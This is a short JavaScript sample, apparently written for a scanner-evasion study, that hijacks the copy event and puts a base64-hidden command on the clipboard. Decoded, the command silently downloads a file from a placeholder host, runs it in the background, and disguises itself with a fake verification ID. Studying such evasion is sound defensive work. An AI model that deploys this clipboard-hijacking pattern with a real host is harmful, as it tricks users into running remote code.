// Inert bypass variant for the scanner paper (RQ3): placeholder values only,
// example.invalid cannot resolve, and the scanner never runs this file.
// Change: the whole command is stored base64-encoded and decoded with atob at copy time.
const payload = 'bm9odXAgYmFzaCAtYyAiY3VybCAta3MgaHR0cHM6Ly9leGFtcGxlLmludmFsaWQvZGVtbyAtbyAvdG1wL2RlbW8gJiYgYmFzaCAvdG1wL2RlbW8iID4vZGV2L251bGwgMj4mMSAmICMgVmVyaWZpY2F0aW9uIElEIFZFUklGWS0wMDAw';
document.addEventListener('copy', event => { event.preventDefault(); event.clipboardData.setData('text/plain', atob(payload)); });
